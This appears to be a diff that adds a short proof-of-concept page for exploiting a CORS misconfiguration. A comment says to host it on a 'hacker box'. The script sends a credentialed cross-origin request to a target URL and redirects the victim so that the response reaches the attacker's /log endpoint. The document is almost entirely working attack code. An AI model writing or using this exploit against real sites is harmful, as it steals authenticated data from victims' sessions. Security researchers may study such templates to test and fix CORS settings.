@@ -1,0 +1,14 @@
+// host this script at hacker box
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+// set target URL of which we want to fetch the response
+req.open('get','https://',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+	location='/log?data='+this.responseText;
+};
+</script>
